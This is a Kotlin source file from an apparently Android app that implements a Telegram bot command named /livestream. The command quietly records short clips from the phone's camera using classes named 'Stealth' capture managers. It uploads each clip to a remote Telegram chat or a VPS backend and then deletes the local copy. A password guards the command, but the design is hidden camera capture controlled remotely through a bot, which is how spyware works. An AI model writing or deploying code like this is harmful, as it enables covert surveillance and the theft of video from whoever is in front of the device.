package com.izhaanintellect.pasa.commands

import android.content.Context
import android.util.Log
import com.izhaanintellect.pasa.bot.SendMessageRequest
import com.izhaanintellect.pasa.bot.TelegramApi
import com.izhaanintellect.pasa.camera.StealthCaptureBridge
import com.izhaanintellect.pasa.camera.StealthVideoManager
import com.izhaanintellect.pasa.data.PreferencesManager
import com.izhaanintellect.pasa.network.PasaBackendApi
import com.izhaanintellect.pasa.security.AuthManager
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Enables near-live video streaming from the device camera via Telegram.
 *
 * Records short 5-second video segments and dispatches them sequentially as video messages
 * to the owner's Telegram chat via the VPS backend control plane or direct bot API.
 *
 * Commands: /livestream [front|back] [duration_minutes]
 */
@Singleton
class LiveStreamCommand @Inject constructor(
    @ApplicationContext private val context: Context,
    private val preferencesManager: PreferencesManager,
    private val telegramApi: TelegramApi,
    private val pasaBackendApi: PasaBackendApi,
    private val stealthVideoManager: StealthVideoManager,
    private val authManager: AuthManager
) : Command {

    override val name = "/livestream"
    override val description = "Start near-live video streaming to Telegram"
    override val usage = "/livestream [front|back] [duration_minutes]"

    companion object {
        private const val TAG = "PASA_LiveStream"
        private const val SEGMENT_DURATION_SECONDS = 5
        private const val DEFAULT_DURATION_MINUTES = 5
        private const val MAX_DURATION_MINUTES = 30
        private const val SEGMENT_TIMEOUT_MS = 20000L

        val isStreaming = AtomicBoolean(false)
        private var streamJob: Job? = null
        private val segmentCount = AtomicInteger(0)
    }

    override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
        // SECURITY: Require authentication for this sensitive operation
        val password = args.firstOrNull()
        if (password.isNullOrBlank() || !authManager.verifyMasterPassword(password)) {
            return CommandResult(
                success = false,
                message = """
                    🔐 <b>Authentication Required</b>
                    ━━━━━━━━━━━━━━━━━━━━
                    This sensitive operation requires your master password.

                    <b>Usage:</b>
                    <code>/livestream &lt;password&gt; [front|back] [duration]</code>

                    <b>Examples:</b>
                    <code>/livestream mypassword front 5</code>
                    <code>/livestream mypassword back 10</code>
                """.trimIndent()
            )
        }

        if (isStreaming.get()) {
            return CommandResult(
                success = false,
                message = "⚠️ A live stream is already active. Send <code>/stopstream</code> to end it first."
            )
        }

        // Parse arguments (skip password which is args[0])
        var useFront = true
        var durationMinutes = DEFAULT_DURATION_MINUTES

        for (arg in args.drop(1)) {
            when (arg.lowercase()) {
                "front" -> useFront = true
                "back", "rear" -> useFront = false
                else -> {
                    val mins = arg.toIntOrNull()
                    if (mins != null && mins in 1..MAX_DURATION_MINUTES) {
                        durationMinutes = mins
                    }
                }
            }
        }

        val cameraStr = if (useFront) "Front" else "Back"
        isStreaming.set(true)
        segmentCount.set(0)

        val targetChatId = if (chatId != 0L) chatId else preferencesManager.ownerChatIdLong

        // Launch streaming in background coroutine
        val startTime = System.currentTimeMillis()
        streamJob = CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            val endTime = startTime + (durationMinutes * 60 * 1000L)
            var consecutiveFailures = 0

            // Elevate Foreground Service to Camera & Microphone (Mandatory on Android 14-16)
            com.izhaanintellect.pasa.service.PasaService.elevateServiceToCameraAndMicrophone()

            try {
                while (isActive && isStreaming.get() && System.currentTimeMillis() < endTime) {
                    val segNum = segmentCount.incrementAndGet()
                    val elapsed = (System.currentTimeMillis() - startTime) / 1000
                    val elapsedStr = String.format("%02d:%02d", elapsed / 60, elapsed % 60)

                    Log.i(TAG, "Recording segment $segNum (elapsed: $elapsedStr)")

                    // 1. Primary: headless StealthVideoManager (low-overhead, no Activity churn, fast SD)
                    var videoFile = try {
                        stealthVideoManager.recordVideo(
                            useFrontCamera = useFront,
                            durationSeconds = SEGMENT_DURATION_SECONDS,
                            lowRes = true
                        )
                    } catch (e: Exception) {
                        Log.w(TAG, "Headless recording error on segment $segNum: ${e.message}")
                        null
                    }

                    // 2. Secondary fallback: StealthCaptureBridge (Activity in TOP state)
                    if (videoFile == null || !videoFile.exists() || videoFile.length() == 0L) {
                        Log.i(TAG, "Headless recording returned null, falling back to StealthCaptureBridge")
                        val bridgeResult = try {
                            StealthCaptureBridge.recordVideo(
                                context = context,
                                useFront = useFront,
                                durationSeconds = SEGMENT_DURATION_SECONDS,
                                timeoutMs = SEGMENT_TIMEOUT_MS
                            )
                        } catch (e: Exception) {
                            Log.w(TAG, "Bridge recording error on segment $segNum: ${e.message}")
                            null
                        }
                        videoFile = bridgeResult?.file
                    }

                    if (videoFile != null && videoFile.exists() && videoFile.length() > 0) {
                        consecutiveFailures = 0
                        val caption = "🔴 LIVE [Seg $segNum] — $cameraStr Camera — $elapsedStr elapsed"

                        try {
                            val botToken = preferencesManager.botToken
                            var dispatched = false

                            // Direct Telegram dispatch (Strategy 1: Zero-Storage)
                            if (botToken.isNotBlank() && targetChatId != 0L) {
                                try {
                                    Log.i(TAG, "Uploading segment $segNum (${videoFile.length() / 1024}KB) directly to Telegram")
                                    val mediaType = "video/mp4".toMediaTypeOrNull()
                                    val requestBody = videoFile.asRequestBody(mediaType)
                                    val videoPart = MultipartBody.Part.createFormData(
                                        "video", videoFile.name, requestBody
                                    )
                                    val chatIdPart = targetChatId.toString()
                                        .toRequestBody("text/plain".toMediaTypeOrNull())
                                    val captionPart = caption.toRequestBody("text/plain".toMediaTypeOrNull())

                                    telegramApi.sendVideo(
                                        botToken,
                                        chatIdPart,
                                        videoPart,
                                        captionPart
                                    )
                                    Log.i(TAG, "✅ Segment $segNum sent to Telegram successfully")
                                    dispatched = true
                                } catch (e: Exception) {
                                    Log.w(TAG, "Direct Telegram dispatch failed for segment $segNum: ${e.message}")
                                }
                            }

                            // VPS Backend Gateway fallback
                            if (!dispatched && preferencesManager.useBackendServer) {
                                try {
                                    Log.i(TAG, "Relaying segment $segNum (${videoFile.length() / 1024}KB) via VPS Gateway")
                                    val mediaType = "video/mp4".toMediaTypeOrNull()
                                    val requestBody = videoFile.asRequestBody(mediaType)
                                    val videoPart = MultipartBody.Part.createFormData(
                                        "video", videoFile.name, requestBody
                                    )
                                    val deviceIdBody = preferencesManager.deviceId
                                        .toRequestBody("text/plain".toMediaTypeOrNull())
                                    val captionBody = caption
                                        .toRequestBody("text/plain".toMediaTypeOrNull())

                                    val resp = pasaBackendApi.sendDeviceResponse(
                                        deviceId = deviceIdBody,
                                        commandId = null,
                                        message = captionBody,
                                        photo = null,
                                        audio = null,
                                        video = videoPart,
                                        evidence = null,
                                        latitude = null,
                                        longitude = null
                                    )
                                    if (resp.ok) {
                                        Log.i(TAG, "✅ Segment $segNum relayed via VPS Gateway successfully")
                                        dispatched = true
                                    } else {
                                        Log.w(TAG, "VPS gateway rejected segment $segNum")
                                    }
                                } catch (e: Exception) {
                                    Log.e(TAG, "❌ VPS relay error on segment $segNum: ${e.message}", e)
                                }
                            }

                            if (!dispatched) {
                                consecutiveFailures++
                                Log.w(TAG, "Segment $segNum could not be dispatched via Telegram or VPS gateway (consecutive: $consecutiveFailures)")
                                if (consecutiveFailures >= 3) {
                                    Log.e(TAG, "Too many dispatch failures — stopping livestream")
                                    isStreaming.set(false)
                                }
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Exception during segment $segNum dispatch: ${e.message}", e)
                            consecutiveFailures++
                            if (consecutiveFailures >= 3) {
                                isStreaming.set(false)
                            }
                        } finally {
                            try { videoFile.delete() } catch (_: Exception) {}
                        }
                    } else {
                        consecutiveFailures++
                        Log.w(TAG, "Segment $segNum capture failed (consecutive: $consecutiveFailures)")

                        if (consecutiveFailures >= 5) {
                            Log.e(TAG, "Too many consecutive capture failures — stopping live stream")
                            break
                        }
                    }

                    // Cooldown between segments to let camera ISP & hardware reset, preventing app lag and overheating
                    delay(2000L)
                }
            } catch (_: CancellationException) {
                Log.i(TAG, "Live stream cancelled")
            } catch (e: Exception) {
                Log.e(TAG, "Live stream error", e)
            } finally {
                isStreaming.set(false)
                com.izhaanintellect.pasa.service.PasaService.demoteServiceFromCameraAndMicrophone()

                val totalSegments = segmentCount.get()
                val totalDuration = (System.currentTimeMillis() - startTime) / 1000
                val durationStr = String.format("%02d:%02d", totalDuration / 60, totalDuration % 60)
                val summaryText = """
                    ⏹️ <b>LIVE STREAM ENDED</b>
                    ━━━━━━━━━━━━━━━━━━━━
                    📹 Total segments: <b>$totalSegments</b>
                    ⏱️ Total duration: <b>$durationStr</b>
                    📹 Camera: <b>$cameraStr</b>
                """.trimIndent()

                try {
                    if (preferencesManager.useBackendServer) {
                        val deviceIdBody = preferencesManager.deviceId.toRequestBody("text/plain".toMediaTypeOrNull())
                        val msgBody = summaryText.toRequestBody("text/plain".toMediaTypeOrNull())
                        pasaBackendApi.sendDeviceResponse(
                            deviceId = deviceIdBody,
                            commandId = null,
                            message = msgBody,
                            photo = null,
                            audio = null,
                            video = null,
                            evidence = null,
                            latitude = null,
                            longitude = null
                        )
                    } else if (preferencesManager.botToken.isNotBlank() && targetChatId != 0L) {
                        telegramApi.sendMessage(
                            token = preferencesManager.botToken,
                            request = SendMessageRequest(
                                chatId = targetChatId,
                                text = summaryText
                            )
                        )
                    }
                } catch (_: Exception) {}
            }
        }

        return CommandResult(
            success = true,
            message = """
                🔴 <b>LIVE STREAM ACTIVE</b>
                ━━━━━━━━━━━━━━━━━━━━
                📹 Camera: <b>$cameraStr</b>
                ⏱️ Duration: <b>$durationMinutes minutes</b>
                📡 Segment interval: <b>${SEGMENT_DURATION_SECONDS} seconds</b>
                
                Segments will arrive as sequential video messages.
                Send <code>/stopstream</code> to end.
            """.trimIndent()
        )
    }

    fun stopStream(): CommandResult {
        if (!isStreaming.get()) {
            return CommandResult(
                success = false,
                message = "ℹ️ No active live stream to stop."
            )
        }

        isStreaming.set(false)
        streamJob?.cancel()
        streamJob = null
        com.izhaanintellect.pasa.service.PasaService.demoteServiceFromCameraAndMicrophone()

        return CommandResult(
            success = true,
            message = "⏹️ Live stream stop signal sent. Final summary will follow."
        )
    }
}
